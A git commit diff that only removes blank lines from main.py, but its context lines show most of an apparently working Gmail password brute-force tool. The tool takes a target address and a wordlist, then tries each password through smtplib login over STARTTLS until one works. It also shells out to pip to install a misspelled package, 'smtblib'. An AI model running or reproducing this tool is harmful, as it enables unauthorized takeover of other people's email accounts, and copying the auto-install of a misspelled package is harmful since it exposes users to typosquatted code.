22ed567e89eb0b273c802954bc2d07a1ffe3e107
Sarthak <sarthaktomar2143@gmail.com>
2022-07-19 15:27:31 +0000

    Removed extra spaces from `main.py`.

--- main.py
+++ main.py
@@ -7,11 +7,9 @@
 
 try:
     import smtplib
-
 except ModuleNotFoundError:
     print("smtlib not found, Installing...")
     os.system("python3 -m pip install smtblib")
-
 except:
     pass
 
@@ -21,11 +19,9 @@ import time
 
 try:
     from colorama import Fore, Style
-
 except ModuleNotFoundError:
     print("colorama not found, Installing...")
     os.system("python3 -m pip install colorama")
-
 except:
     pass
 
@@ -42,26 +38,21 @@ try:
     else:
         print(f"{Fore.RED}[!] Invalid GMail Address.{Style.RESET_ALL}")
         sys.exit()
-
 except KeyboardInterrupt:
     print(f"\n{Fore.BLUE}[-] Exiting...{Style.RESET_ALL}")
     time.sleep(1)
     sys.exit()
-
 
 try:
     path = input(f"{Fore.BLUE}[?] Enter wordlist path:{Style.RESET_ALL} ")
-
 except KeyboardInterrupt:
     print(f"\n{Fore.BLUE}[-] Exiting...{Style.RESET_ALL}")
     time.sleep(1)
     sys.exit()
-
 except:
     pass
 
 print(f'{Fore.GREEN}Starting bruteforcing...{Style.RESET_ALL}\n')
-
 
 def bruteForce():
     global start_time
@@ -69,16 +60,13 @@ def bruteForce():
     smtpserver = smtplib.SMTP(HOST, PORT)
     smtpserver.ehlo()
     smtpserver.starttls()
-
     try:
         passwd = [line.strip() for line in open(path)]
-
     except FileNotFoundError:
         print(Fore.RED + "[!] Wordlist not found!" + Style.RESET_ALL)
         sys.exit()
     except:
         pass
-
     for pwd in passwd:
         try:
             smtpserver.login(email, pwd)
@@ -87,27 +75,21 @@ def bruteForce():
             print("[+] Password found!" + Style.RESET_ALL)
             threadLock.release()
             break
-
         except smtplib.SMTPAuthenticationError:
             threadLock.acquire()
             print(Fore.RED + "[!] Incorrect password: " + pwd + Style.RESET_ALL)
             threadLock.release()
-
         except smtplib.SMTPServerDisconnected:
             continue
-
         except KeyboardInterrupt:
             print(f"{Fore.BLUE}\n[-] Exiting...{Style.RESET_ALL}")
             time.sleep(1)
-
         except:
             pass
-
 if __name__ == '__main__':
     t = threading.Thread(target=bruteForce())
     threads.append(t)
     t.start()
-
     for i in threads:
         i.join()
     print(f"\n{Fore.BLUE}[*] Script finished!{Style.RESET_ALL}")
